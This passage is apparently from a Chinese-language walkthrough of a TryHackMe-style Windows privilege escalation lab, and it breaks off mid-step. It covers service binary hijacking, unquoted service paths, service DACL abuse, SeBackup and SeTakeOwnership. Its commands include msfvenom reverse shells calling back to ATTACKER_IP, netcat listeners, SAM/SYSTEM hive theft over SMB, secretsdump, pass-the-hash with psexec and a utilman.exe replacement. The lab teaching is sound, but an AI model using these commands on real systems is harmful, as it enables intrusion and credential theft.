<span class="token property">C</span><span class="token punctuation">:</span>\PROGRA~2\SYSTEM~1\WService.exe <span class="token property">Everyone</span><span class="token punctuation">:</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span>
                                  NT AUTHORITY\<span class="token property">SYSTEM</span><span class="token punctuation">:</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>
                                  BUILTIN\<span class="token property">Administrators</span><span class="token punctuation">:</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>
                                  BUILTIN\<span class="token property">Users</span><span class="token punctuation">:</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>RX<span class="token punctuation">)</span>
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION <span class="token property">PACKAGES</span><span class="token punctuation">:</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>RX<span class="token punctuation">)</span>
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION <span class="token property">PACKAGES</span><span class="token punctuation">:</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>RX<span class="token punctuation">)</span>

Successfully processed 1 files<span class="token punctuation">;</span> Failed processing 0 files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里有一些有趣的事情。 Everyone 组对服务的可执行文件具有修改权限 (M)。这意味着我们可以简单地用我们偏好的任何有效负载覆盖它，并且该服务将使用配置的用户帐户的权限执行它。</p>
<p>让我们使用 msfvenom 生成一个 exe-service 负载并通过 python Web 服务器提供它：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

user@attackerpc$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 <span class="token punctuation">(</span><span class="token property">http</span><span class="token punctuation">:</span><span class="token comment">//0.0.0.0:8000/) ...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后我们可以使用以下命令从 Powershell 中提取有效负载：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">wget <span class="token property">http</span><span class="token punctuation">:</span><span class="token comment">//ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>一旦有效负载位于 Windows 服务器中，我们就继续用有效负载替换服务可执行文件。由于我们需要另一个用户来执行我们的有效负载，因此我们还希望向Everyone组授予完全权限：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; cd <span class="token property">C</span><span class="token punctuation">:</span>\PROGRA~2\SYSTEM~1\

<span class="token property">C</span><span class="token punctuation">:</span>\PROGRA~2\SYSTEM~1&gt; move WService.exe WService.exe.bkp
        1 <span class="token function">file</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> moved.

<span class="token property">C</span><span class="token punctuation">:</span>\PROGRA~2\SYSTEM~1&gt; move <span class="token property">C</span><span class="token punctuation">:</span>\Users\thm-unpriv\rev-svc.exe WService.exe
        1 <span class="token function">file</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> moved.

<span class="token property">C</span><span class="token punctuation">:</span>\PROGRA~2\SYSTEM~1&gt; icacls WService.exe /grant <span class="token property">Everyone</span><span class="token punctuation">:</span>F
        Successfully processed 1 files.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们在攻击者机器上启动一个反向侦听器：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">user@attackerpc$ nc -lvp 4445<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>最后，重新启动服务。虽然在正常情况下，您可能需要等待服务重新启动，但您已被分配了自行重新启动服务的权限，以节省一些时间。从 cmd.exe 命令提示符使用以下命令：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; sc stop windowsscheduler
<span class="token property">C</span><span class="token punctuation">:</span>\&gt; sc start windowsscheduler<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>注意：PowerShell 将 <code>sc</code> 作为 <code>Set-Content</code> 的别名，因此您需要使用 <code>sc.exe</code> 才能以这种方式使用 PowerShell 控制服务。</p>
<p>结果，您将获得具有 svcusr1 权限的反向 shell：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">user@attackerpc$ nc -lvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
<span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2018 Microsoft Corporation. All rights reserved.

<span class="token property">C</span><span class="token punctuation">:</span>\Windows\system32&gt;whoami
wprivesc1\svcusr1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="4-5-未加引号的服务路径">4.5 未加引号的服务路径</h2>
<p>当我们无法像以前一样直接写入服务可执行文件时，仍然有机会通过使用相当模糊的功能来强制服务运行任意可执行文件。</p>
<p>使用 Windows 服务时，当服务配置为指向“未加引号”的可执行文件时，会出现非常特殊的行为。不加引号是指未正确引用关联可执行文件的路径以解决命令中的空格问题。</p>
<p>作为示例，让我们看一下两个服务之间的区别（这些服务仅用作示例，可能在您的计算机中不可用）。第一个服务将使用正确的引用，以便 SCM 毫无疑问地知道它必须执行 <code>"C:\Program Files\RealVNC\VNC Server\vncserver.exe"</code> 指向的二进制文件，后跟给定的参数：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; sc qc <span class="token string">"vncserver"</span>
[SC] QueryServiceConfig SUCCESS

<span class="token property">SERVICE_NAME</span><span class="token punctuation">:</span> vncserver
        <span class="token property">TYPE</span>               <span class="token punctuation">:</span> 10  WIN32_OWN_PROCESS
        <span class="token property">START_TYPE</span>         <span class="token punctuation">:</span> 2   AUTO_START
        <span class="token property">ERROR_CONTROL</span>      <span class="token punctuation">:</span> 0   IGNORE
        <span class="token property">BINARY_PATH_NAME</span>   <span class="token punctuation">:</span> <span class="token string">"C:\Program Files\RealVNC\VNC Server\vncserver.exe"</span> -service
        <span class="token property">LOAD_ORDER_GROUP</span>   <span class="token punctuation">:</span>
        <span class="token property">TAG</span>                <span class="token punctuation">:</span> 0
        <span class="token property">DISPLAY_NAME</span>       <span class="token punctuation">:</span> VNC Server
        <span class="token property">DEPENDENCIES</span>       <span class="token punctuation">:</span>
        <span class="token property">SERVICE_START_NAME</span> <span class="token punctuation">:</span> LocalSystem<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>请记住：PowerShell 将“sc”作为“Set-Content”的别名，因此，如果您处于 PowerShell 提示符中，则需要使用“sc.exe”来控制服务。</strong></p>
<p>现在让我们看看另一项没有正确报价的服务：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; sc qc <span class="token string">"disk sorter enterprise"</span>
[SC] QueryServiceConfig SUCCESS

<span class="token property">SERVICE_NAME</span><span class="token punctuation">:</span> disk sorter enterprise
        <span class="token property">TYPE</span>               <span class="token punctuation">:</span> 10  WIN32_OWN_PROCESS
        <span class="token property">START_TYPE</span>         <span class="token punctuation">:</span> 2   AUTO_START
        <span class="token property">ERROR_CONTROL</span>      <span class="token punctuation">:</span> 0   IGNORE
        <span class="token property">BINARY_PATH_NAME</span>   <span class="token punctuation">:</span> <span class="token property">C</span><span class="token punctuation">:</span>\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        <span class="token property">LOAD_ORDER_GROUP</span>   <span class="token punctuation">:</span>
        <span class="token property">TAG</span>                <span class="token punctuation">:</span> 0
        <span class="token property">DISPLAY_NAME</span>       <span class="token punctuation">:</span> Disk Sorter Enterprise
        <span class="token property">DEPENDENCIES</span>       <span class="token punctuation">:</span>
        <span class="token property">SERVICE_START_NAME</span> <span class="token punctuation">:</span> .\svcusr2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当 SCM 尝试执行关联的二进制文件时，就会出现问题。由于“Disk Sorter Enterprise”文件夹的名称上有空格，因此该命令变得不明确，并且 SCM 不知道您正在尝试执行以下哪一个：</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Argument 1</th>
<th>Argument 2</th>
</tr>
</thead>
<tbody>
<tr>
<td>C:\MyPrograms\Disk.exe</td>
<td>Sorter</td>
<td>Enterprise\bin\disksrs.exe</td>
</tr>
<tr>
<td>C:\MyPrograms\Disk Sorter.exe</td>
<td>Enterprise\bin\disksrs.exe</td>
<td></td>
</tr>
<tr>
<td>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>这与命令提示符如何解析命令有关。通常，当您发送命令时，空格将用作参数分隔符，除非它们是带引号的字符串的一部分。这意味着未加引号的命令的“正确”解释是执行 <code>C:\\MyPrograms\\Disk.exe</code> 并将其余部分作为参数。</p>
<p>SCM 没有像它可能应该发生的那样失败，而是尝试帮助用户并开始按照表中所示的顺序搜索每个二进制文件：</p>
<ol>
<li>首先，搜索 <code>C:\\MyPrograms\\Disk.exe</code> 。如果存在，该服务将运行此可执行文件。</li>
<li>如果后者不存在，它将搜索 <code>C:\\MyPrograms\\Disk Sorter.exe</code> 。如果存在，该服务将运行此可执行文件。</li>
<li>如果后者不存在，它将搜索 <code>C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe</code> 。此选项预计会成功，并且通常会在默认安装中运行。</li>
</ol>
<p>从这个行为来看，问题就显而易见了。如果攻击者创建了在预期服务可执行文件之前搜索的任何可执行文件，他们就可以强制服务运行任意可执行文件。</p>
<p>虽然这听起来微不足道，但默认情况下，大多数服务可执行文件将安装在 <code>C:\Program Files</code> 或 <code>C:\Program Files (x86)</code> 下，非特权用户无法写入。这可以防止任何易受攻击的服务被利用。此规则也有例外： - 某些安装程序更改已安装文件夹的权限，使服务容易受到攻击。 - 管理员可能决定将服务二进制文件安装在非默认路径中。如果这样的路径是全局可写的，则该漏洞可以被利用。</p>
<p>在我们的例子中，管理员在 <code>c:\MyPrograms</code> 下安装了磁盘排序器二进制文件。默认情况下，它继承 <code>C:\</code> 目录的权限，允许任何用户在其中创建文件和文件夹。我们可以使用 <code>icacls</code> 来检查：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt;icacls <span class="token property">c</span><span class="token punctuation">:</span>\MyPrograms
<span class="token property">c</span><span class="token punctuation">:</span>\MyPrograms NT AUTHORITY\<span class="token property">SYSTEM</span><span class="token punctuation">:</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>
              BUILTIN\<span class="token property">Administrators</span><span class="token punctuation">:</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>
              BUILTIN\<span class="token property">Users</span><span class="token punctuation">:</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>RX<span class="token punctuation">)</span>
              BUILTIN\<span class="token property">Users</span><span class="token punctuation">:</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>AD<span class="token punctuation">)</span>
              BUILTIN\<span class="token property">Users</span><span class="token punctuation">:</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>WD<span class="token punctuation">)</span>
              CREATOR <span class="token property">OWNER</span><span class="token punctuation">:</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>

Successfully processed 1 files<span class="token punctuation">;</span> Failed processing 0 files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>BUILTIN\\Users</code> 组拥有AD和WD权限，分别允许用户创建子目录和文件。</p>
<p>使用 msfvenom 创建 exe-service Payload 并将其传输到目标主机的过程与以前相同，因此请像以前一样创建以下 Payload 并将其上传到服务器。我们还将启动一个侦听器来接收反向 shell 执行时的情况：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

user@attackerpc$ nc -lvp 4446<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>一旦有效负载进入服务器，请将其移动到可能发生劫持的任何位置。在这种情况下，我们将把有效负载移动到 <code>C:\MyPrograms\Disk.exe</code> 。我们还将授予每个人对该文件的完全权限，以确保该服务可以执行该文件：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; move <span class="token property">C</span><span class="token punctuation">:</span>\Users\thm-unpriv\rev-svc2.exe <span class="token property">C</span><span class="token punctuation">:</span>\MyPrograms\Disk.exe

<span class="token property">C</span><span class="token punctuation">:</span>\&gt; icacls <span class="token property">C</span><span class="token punctuation">:</span>\MyPrograms\Disk.exe /grant <span class="token property">Everyone</span><span class="token punctuation">:</span>F
        Successfully processed 1 files.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>服务重新启动后，您的有效负载应该执行：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; sc stop <span class="token string">"disk sorter enterprise"</span>
<span class="token property">C</span><span class="token punctuation">:</span>\&gt; sc start <span class="token string">"disk sorter enterprise"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>结果，您将获得具有 svcusr2 权限的反向 shell：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">user@attackerpc$ nc -lvp 4446
Listening on 0.0.0.0 4446
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
<span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2018 Microsoft Corporation. All rights reserved.

<span class="token property">C</span><span class="token punctuation">:</span>\Windows\system32&gt;whoami
wprivesc1\svcusr2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="4-6-不安全的服务权限">4.6 不安全的服务权限</h2>
<p>如果服务的可执行 DACL 配置良好，并且正确引用了服务的二进制路径，那么您仍然有机会利用该服务。如果服务 DACL（不是服务的可执行 DACL）允许您修改服务的配置，您将能够重新配置该服务。这将允许您指向所需的任何可执行文件并使用您喜欢的任何帐户运行它，包括 SYSTEM 本身。</p>
<p>要从命令行检查服务 DACL，您可以使用 Sysinternals 套件中的 Accesschk。为了您的方便，可在 <code>C:\\tools</code> 获取副本。检查 thmservice 服务 DACL 的命令是：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\tools\AccessChk&gt; accesschk64.exe -qlc thmservice
  [0] <span class="token property">ACCESS_ALLOWED_ACE_TYPE</span><span class="token punctuation">:</span> NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] <span class="token property">ACCESS_ALLOWED_ACE_TYPE</span><span class="token punctuation">:</span> BUILTIN\Users
        SERVICE_ALL_ACCESS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里我们可以看到 <code>BUILTIN\\Users</code> 组拥有SERVICE_ALL_ACCESS权限，这意味着任何用户都可以重新配置服务。</p>
<p>在更改服务之前，让我们构建另一个 exe-service 反向 shell，并在攻击者的计算机上启动它的侦听器：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

user@attackerpc$ nc -lvp 4447<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后，我们将反向 shell 可执行文件传输到目标机器并将其存储在 <code>C:\Users\thm-unpriv\rev-svc3.exe</code> 中。请随意使用 wget 传输您的可执行文件并将其移动到所需的位置。请记住授予每个人执行您的有效负载的权限：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; icacls <span class="token property">C</span><span class="token punctuation">:</span>\Users\thm-unpriv\rev-svc3.exe /grant <span class="token property">Everyone</span><span class="token punctuation">:</span>F<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>要更改服务关联的可执行文件和帐户，我们可以使用以下命令（使用 sc.exe 时请注意等号后面的空格）：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; sc config THMService binPath= <span class="token string">"C:\Users\thm-unpriv\rev-svc3.exe"</span> obj= LocalSystem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>请注意，我们可以使用任何帐户来运行该服务。我们选择 LocalSystem，因为它是可用的最高特权帐户。要触发我们的有效负载，剩下的就是重新启动服务：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; sc stop THMService
<span class="token property">C</span><span class="token punctuation">:</span>\&gt; sc start THMService<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>我们将在攻击者的机器上收到一个具有系统权限的 shell：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">user@attackerpc$ nc -lvp 4447
Listening on 0.0.0.0 4447
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
<span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2018 Microsoft Corporation. All rights reserved.

<span class="token property">C</span><span class="token punctuation">:</span>\Windows\system32&gt;whoami
NT AUTHORITY\SYSTEM<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="tips">tips</h3>
<p>权限是帐户执行特定系统相关任务所拥有的权利。这些任务可以像关闭计算机的权限一样简单，也可以像绕过某些基于 DACL 的访问控制的权限一样简单。</p>
<p>每个用户都有一组分配的权限，可以使用以下命令进行检查：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">whoami /priv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>此处提供了 Windows 系统上可用权限的完整列表。从攻击者的角度来看，只有那些允许我们在系统中升级的权限才有意义。您可以在 Priv2Admin Github 项目上找到可利用权限的完整列表。</p>
<p>虽然我们不会逐一查看，但我们将展示如何滥用您可以找到的一些最常见的特权。</p>
<h2 id="4-7-SeBackup-SeRestore">4.7 SeBackup / SeRestore</h2>
<p>SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，忽略任何 DACL。此权限背后的想法是允许某些用户从系统执行备份，而无需完全管理权限。</p>
<p>有了这种能力，攻击者可以使用多种技术轻松提升系统权限。我们将研究的方法包括复制 SAM 和 SYSTEM 注册表配置单元以提取本地管理员的密码哈希值。</p>
<p>接下来实操的帐户属于“Backup Operators”组，默认情况下被授予 SeBackup 和 SeRestore 权限。我们需要使用“以管理员身份打开”选项打开命令提示符才能使用这些权限。我们将被要求再次输入密码以获得提升的控制台：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104544115.png" alt="image-20240206104544115"></p>
<p>进入命令提示符后，我们可以使用以下命令检查我们的权限：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files <span class="token operator">and</span> directories  Disabled
SeRestorePrivilege            Restore files <span class="token operator">and</span> directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>要备份 SAM 和 SYSTEM 哈希值，我们可以使用以下命令：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; reg save hklm\system <span class="token property">C</span><span class="token punctuation">:</span>\Users\THMBackup\system.hive
The operation completed successfully.

<span class="token property">C</span><span class="token punctuation">:</span>\&gt; reg save hklm\sam <span class="token property">C</span><span class="token punctuation">:</span>\Users\THMBackup\sam.hive
The operation completed successfully.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这将创建几个包含注册表配置单元内容的文件。现在，我们可以使用 SMB 或任何其他可用方法将这些文件复制到攻击者计算机。对于 SMB，我们可以使用 impacket 的 <code>smbserver.py</code> 在 AttackBox 的当前目录中启动一个带有网络共享的简单 SMB 服务器：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这将创建一个名为 <code>public</code> 的共享，指向 <code>share</code> 目录，该目录需要当前 Windows 会话的用户名和密码。之后，我们可以在 Windows 机器中使用 <code>copy</code> 命令将这两个文件传输到 AttackBox：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; copy <span class="token property">C</span><span class="token punctuation">:</span>\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
<span class="token property">C</span><span class="token punctuation">:</span>\&gt; copy <span class="token property">C</span><span class="token punctuation">:</span>\Users\THMBackup\system.hive \\ATTACKER_IP\public\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>并使用 impacket 检索用户的密码哈希值：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 <span class="token operator">-</span> Copyright 2021 SecureAuth Corporation

[*] Target system <span class="token property">bootKey</span><span class="token punctuation">:</span> 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes <span class="token punctuation">(</span><span class="token property">uid</span><span class="token punctuation">:</span><span class="token property">rid</span><span class="token punctuation">:</span><span class="token property">lmhash</span><span class="token punctuation">:</span>nthash<span class="token punctuation">)</span>
<span class="token property">Administrator</span><span class="token punctuation">:</span><span class="token property">500</span><span class="token punctuation">:</span><span class="token property">aad3b435b51404eeaad3b435b51404ee</span><span class="token punctuation">:</span><span class="token property">13a04cdcf3f7ec41264e568127c5ca94</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>
<span class="token property">Guest</span><span class="token punctuation">:</span><span class="token property">501</span><span class="token punctuation">:</span><span class="token property">aad3b435b51404eeaad3b435b51404ee</span><span class="token punctuation">:</span><span class="token property">31d6cfe0d16ae931b73c59d7e0c089c0</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们终于可以使用管理员的哈希来执行哈希传递攻击并获得具有系统权限的目标计算机的访问权限：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes <span class="token property">aad3b435b51404eeaad3b435b51404ee</span><span class="token punctuation">:</span>13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP
Impacket v0.9.24.dev1+20210704.162046.29ad5792 <span class="token operator">-</span> Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
<span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2018 Microsoft Corporation. All rights reserved.

<span class="token property">C</span><span class="token punctuation">:</span>\Windows\system32&gt; whoami
nt authority\system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="4-8-SeTakeOwnership">4.8 SeTakeOwnership</h2>
<p>SeTakeOwnership 权限允许用户获取系统上任何对象的所有权，包括文件和注册表项，这为攻击者提升权限提供了多种可能性，例如，我们可以搜索作为 SYSTEM 运行的服务并获取所有权服务的可执行文件。然而，对于这项任务，我们将采取不同的路线。</p>
<p>要获得 SeTakeOwnership 权限，我们需要使用“以管理员身份打开”选项打开命令提示符。我们将被要求输入密码以获得提升的控制台：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104653145.png" alt="image-20240206104653145"></p>
<p>进入命令提示符后，我们可以使用以下命令检查我们的权限：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files <span class="token operator">or</span> other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这次我们将滥用 <code>utilman.exe</code> 来升级权限。 Utilman 是一个内置的 Windows 应用程序，用于在锁定屏幕期间提供“轻松访问”选项：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104707798.png" alt="image-20240206104707798"></p>
<p>由于 Utilman 是以 SYSTEM 权限运行的，因此如果我们将原始二进制文件替换为我们喜欢的任何有效负载，我们将有效地获得 SYSTEM 权限。由于我们可以拥有任何文件的所有权，因此替换它是微不足道的。</p>
<p>要替换 utilman，我们将首先使用以下命令获取它的所有权：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; takeown /f <span class="token property">C</span><span class="token punctuation">:</span>\Windows\System32\Utilman.exe

<span class="token property">SUCCESS</span><span class="token punctuation">:</span> The file <span class="token punctuation">(</span>or folder<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"C:\Windows\System32\Utilman.exe"</span> now owned by user <span class="token string">"WINPRIVESC2\thmtakeownership"</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>请注意，成为文件的所有者并不一定意味着您拥有该文件的权限，但作为所有者，您可以为自己分配所需的任何权限。要为您的用户授予 utilman.exe 的完全权限，您可以使用以下命令：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\&gt; icacls <span class="token property">C</span><span class="token punctuation">:</span>\Windows\System32\Utilman.exe /grant <span class="token property">THMTakeOwnership</span><span class="token punctuation">:</span>F
processed <span class="token property">file</span><span class="token punctuation">:</span> Utilman.exe
Successfully processed 1 files<span class="token punctuation">;</span> Failed processing 0 files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>之后，我们将用 cmd.exe 的副本替换 utilman.exe：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">C</span><span class="token punctuation">:</span>\Windows\System32\&gt; copy cmd.exe utilman.exe
